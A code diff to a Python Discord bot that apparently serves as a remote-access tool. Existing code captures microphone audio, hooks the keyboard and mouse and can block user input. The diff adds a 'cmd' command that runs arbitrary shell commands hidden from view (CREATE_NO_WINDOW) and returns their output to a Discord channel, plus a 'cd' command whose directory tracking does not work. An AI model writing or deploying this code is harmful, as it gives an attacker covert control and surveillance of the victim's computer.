@@ -14,7 +14,7 @@ import numpy as np
 import pyaudio
 from pynput import keyboard, mouse
 from time import sleep
-
+import subprocess
 # Load environment variables
 load_dotenv()
 TOKEN = os.getenv("DISCORD_BOT_TOKEN")
@@ -35,7 +35,7 @@ FORMAT = pyaudio.paInt16
 CHANNELS = 2
 RATE = 48000
 CURRENT_DIRECTORY = os.path.dirname(os.path.abspath(__file__))
-
+PWD = 'C:\\'
 class PyAudioPCM(discord.AudioSource):
     def __init__(self, channels=CHANNELS, rate=RATE, chunk=CHUNK, input_device=1) -> None:
         print("Initializing PyAudioPCM...")
@@ -295,7 +295,30 @@ async def unblockinput(ctx):
     mouse_listener.stop()
     await ctx.send('`Unblocked user input`')
 @bot.command(name='cmd')
-async def cmd(ctx, *args):
-    pass
+async def cmd(ctx,timeout=10, *args):
+    command = ' '.join(args)
+    try:
+        result = subprocess.run(
+                command,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                creationflags=subprocess.CREATE_NO_WINDOW,
+                shell=True,  # Use shell=True for commands like 'dir', 'echo', etc.
+                timeout=timeout
+            )
+        output = result.stdout.decode()
+        error = result.stderr.decode()
+        if error == None or error == '':
+            await ctx.send(f"`{output}`")
+        else:
+             await ctx.send(f"`Error:{error}`")
+    except subprocess.TimeoutExpired as e:
+        await ctx.send(f"`Timeout of {timeout} seconds has passed.`")
 
+    except Exception as e:
+        await ctx.send(f"`Error has occuried: {e}`")
+@bot.command(name='cd')
+async def cd(ctx, name):
+    PWD = os.path.join(PWD, name)
+    await ctx.send(f"`Directory changed:{PWD}`")
 bot.run(TOKEN)
